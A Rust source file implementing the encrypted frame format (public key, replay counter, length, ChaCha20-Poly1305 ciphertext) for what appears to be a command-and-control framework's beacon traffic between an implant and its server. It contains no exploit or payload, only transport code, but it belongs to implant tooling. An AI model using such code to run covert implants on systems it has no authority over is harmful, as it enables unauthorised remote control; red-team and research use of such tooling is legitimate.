//! Transport frame: the per-request body layout, parsed and (de)crypted here.
//!
//! `[32B pubkey][8B counter LE][4B ct_len LE][ciphertext || 16B Poly1305 tag]`
//!
//! The pubkey identifies & keys the session (it is also the AEAD AAD), so the
//! server can be largely stateless per request: read pubkey → derive/look up
//! key → decrypt. The counter is anti-replay (monotonic, checked server-side).

use crate::crypto::{self, Direction, SessionKey, PUBKEY_LEN};
use crate::wire::WireError;
use alloc::vec::Vec;

/// pubkey(32) + counter(8) + length(4)
pub const FRAME_HEADER: usize = PUBKEY_LEN + 8 + 4;
/// Poly1305 authentication tag.
pub const TAG_LEN: usize = 16;
/// Upper bound on a beacon frame's declared ciphertext length. Beacon payloads
/// are tiny (a SessionInfo or a small task/response batch), so anything larger
/// is either malformed or an attempt to induce an oversized allocation.
/// Defense-in-depth on top of the transport's body-size limit (the raw-TLS
/// `serve_connection` path has no default limit, so this cap is the backstop).
pub const MAX_CT_LEN: usize = 512 * 1024; // 512 KiB — matches documented limit

/// Lower bound on a beacon frame's declared ciphertext length. A real frame
/// always carries at least one byte of plaintext (a SessionInfo, a task
/// batch's `u32 count`, a response batch's `u32 count` — never empty), so the
/// ciphertext is always `≥ TAG_LEN + 1`. A frame whose ct_len equals exactly
/// `TAG_LEN` would carry zero plaintext bytes — the AEAD's "all tag, no data"
/// degenerate case, which an attacker could craft without compromising the
/// key. Reject it at the parser so the decoder never has to handle an empty
/// plaintext (the wire codec doesn't define a meaningful interpretation for
/// one anyway). Defense-in-depth, not a correctness fix.
pub const MIN_CT_LEN: usize = TAG_LEN + 1;

/// A frame that has been parsed but not yet decrypted.
#[derive(Debug, Clone)]
pub struct RawFrame {
    pub pubkey: [u8; PUBKEY_LEN],
    pub counter: u64,
    pub ciphertext: Vec<u8>,
}

/// Error from [`encode_frame_dir`] / [`encode_frame`].
///
/// Surfaced as a `Result` (not a panic) because both the server and the
/// no_std implant build with `panic = "abort"`; the caller decides whether to
/// retry, shrink the batch, drop the frame, or terminate.
#[derive(Debug)]
pub enum FrameError {
    /// The underlying AEAD seal failed (allocator failure — the AEAD itself is
    /// otherwise infallible). Callers should drop or retry the frame.
    Aead(chacha20poly1305::Error),
    /// Plaintext was empty. A beacon frame must carry at least one plaintext
    /// byte — the receiver's [`MIN_CT_LEN`] rejects the resulting "all tag, no
    /// data" frame anyway, so sealing one here would be wasted work. Previously
    /// an `assert!` (panic); now a checked error so `panic = "abort"` builds
    /// get a recovery path instead of a process teardown.
    EmptyPlaintext,
    /// Plaintext too large: sealing it would produce a ciphertext exceeding
    /// [`MAX_CT_LEN`] (`plaintext_len + TAG_LEN > MAX_CT_LEN`). The receiver's
    /// [`parse_frame`] rejects such frames outright, so sealing one here would
    /// be wasted work and a silently dropped reply. The caller must split the
    /// payload into smaller batches.
    PlaintextTooLarge {
        plaintext_len: usize,
        max_plaintext_len: usize,
    },
}

impl core::fmt::Display for FrameError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            FrameError::Aead(e) => write!(f, "frame seal failed (AEAD): {e}"),
            FrameError::EmptyPlaintext => f.write_str(
                "frame plaintext is empty: a beacon frame must carry at least one plaintext byte",
            ),
            FrameError::PlaintextTooLarge {
                plaintext_len,
                max_plaintext_len,
            } => write!(
                f,
                "frame plaintext too large: {plaintext_len} bytes exceeds the \
                 {max_plaintext_len}-byte cap (ciphertext would exceed {MAX_CT_LEN})"
            ),
        }
    }
}

#[cfg(feature = "std")]
impl std::error::Error for FrameError {}

/// Build a complete request frame from plaintext, sealed with the given
/// [`Direction`]'s nonce space. The direction must match what the receiver
/// will use in [`open_frame_dir`].
///
/// Returns [`FrameError::Aead`] if the underlying AEAD encrypt fails
/// (allocator failure — the AEAD itself is otherwise infallible),
/// [`FrameError::PlaintextTooLarge`] if sealing `plaintext` would produce a
/// ciphertext over [`MAX_CT_LEN`], or [`FrameError::EmptyPlaintext`] if
/// `plaintext` is empty. The over-cap case is rejected here because the
/// receiver's [`parse_frame`] drops those frames — failing fast surfaces the
/// error at the source.
///
/// An empty plaintext is likewise rejected (checked error, not a panic): the
/// wire codec never produces a zero-byte plaintext (every batch carries at
/// least a `u32 count` and every SessionInfo is non-empty), so it signals a
/// caller bug, and the receiver's [`MIN_CT_LEN`] would reject the resulting
/// "all-tag, no-data" frame anyway.
pub fn encode_frame_dir(
    pubkey: &[u8; PUBKEY_LEN],
    dir: Direction,
    counter: u64,
    key: &SessionKey,
    plaintext: &[u8],
) -> Result<Vec<u8>, FrameError> {
    if plaintext.is_empty() {
        return Err(FrameError::EmptyPlaintext);
    }
    // Encode-side size cap (the receive side enforces the same bound in
    // parse_frame): the AEAD appends a TAG_LEN-byte tag, so a plaintext of
    // `MAX_CT_LEN - TAG_LEN + 1` bytes would already produce an over-cap
    // ciphertext. Reject before sealing — a frame above the cap would be
    // dropped by the receiver anyway.
    if plaintext.len() + TAG_LEN > MAX_CT_LEN {
        return Err(FrameError::PlaintextTooLarge {
            plaintext_len: plaintext.len(),
            max_plaintext_len: MAX_CT_LEN - TAG_LEN,
        });
    }
    let ciphertext =
        crypto::seal_dir(key, dir, counter, pubkey, plaintext).map_err(FrameError::Aead)?;
    let mut out = Vec::with_capacity(FRAME_HEADER + ciphertext.len());
    out.extend_from_slice(pubkey);
    out.extend_from_slice(&counter.to_le_bytes());
    out.extend_from_slice(&(ciphertext.len() as u32).to_le_bytes());
    out.extend_from_slice(&ciphertext);
    Ok(out)
}

/// Back-compat shim: seals with [`Direction::ClientToServer`] (the historical
/// implant→server direction). Existing implant/agent-dev callers that *send*
/// should keep using this; server senders must use [`encode_frame_dir`] with
/// [`Direction::ServerToClient`]. See [`encode_frame_dir`] for error semantics.
#[deprecated(
    note = "hardcodes Direction::ClientToServer; use encode_frame_dir with an explicit direction instead"
)]
pub fn encode_frame(
    pubkey: &[u8; PUBKEY_LEN],
    counter: u64,
    key: &SessionKey,
    plaintext: &[u8],
) -> Result<Vec<u8>, FrameError> {
    encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, plaintext)
}

/// Parse (but do not decrypt) a frame received off the wire.
pub fn parse_frame(frame: &[u8]) -> Result<RawFrame, WireError> {
    if frame.len() < FRAME_HEADER {
        return Err(WireError::Eof);
    }
    let mut pubkey = [0u8; PUBKEY_LEN];
    pubkey.copy_from_slice(&frame[..PUBKEY_LEN]);
    // The `frame.len() < FRAME_HEADER` check above guarantees these slices are
    // exactly 8 / 4 bytes; the conversions are still checked (rather than
    // `expect`) so a future header change can't introduce a panic in
    // `panic = "abort"` builds.
    let counter = u64::from_le_bytes(
        frame[PUBKEY_LEN..PUBKEY_LEN + 8]
            .try_into()
            .map_err(|_| WireError::Eof)?,
    );
    let ct_len = u32::from_le_bytes(
        frame[PUBKEY_LEN + 8..PUBKEY_LEN + 12]
            .try_into()
            .map_err(|_| WireError::Eof)?,
    ) as usize;
    let ct_end = FRAME_HEADER + ct_len;
    // Require the frame to be length-exact (no unauthenticated trailing bytes)
    // AND that the declared ciphertext is within the beacon bounds. The upper
    // cap (MAX_CT_LEN) is a backstop against a future extractor change or the
    // raw-TLS serve_connection path (which has no body-size limit) turning a
    // bogus ct_len into a huge allocation. The lower bound (MIN_CT_LEN) rejects
    // the "all tag, no data" degenerate case so the decoder never has to handle
    // an empty plaintext — see MIN_CT_LEN for the rationale.
    if frame.len() != ct_end || !(MIN_CT_LEN..=MAX_CT_LEN).contains(&ct_len) {
        return Err(WireError::BadLen(ct_len));
    }
    let ciphertext = frame[FRAME_HEADER..ct_end].to_vec();
    Ok(RawFrame {
        pubkey,
        counter,
        ciphertext,
    })
}

/// Decrypt a parsed frame using the given direction's nonce space.
pub fn open_frame_dir(
    key: &SessionKey,
    dir: Direction,
    raw: &RawFrame,
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    crypto::open_dir(key, dir, raw.counter, &raw.pubkey, &raw.ciphertext)
}

/// Back-compat shim: opens with [`Direction::ClientToServer`]. Existing
/// server/implant callers that *receive* implant-origin frames should keep
/// using this; receivers of server-origin frames must use [`open_frame_dir`]
/// with [`Direction::ServerToClient`].
#[deprecated(
    note = "hardcodes Direction::ClientToServer; use open_frame_dir with an explicit direction instead"
)]
pub fn open_frame(key: &SessionKey, raw: &RawFrame) -> Result<Vec<u8>, chacha20poly1305::Error> {
    open_frame_dir(key, Direction::ClientToServer, raw)
}
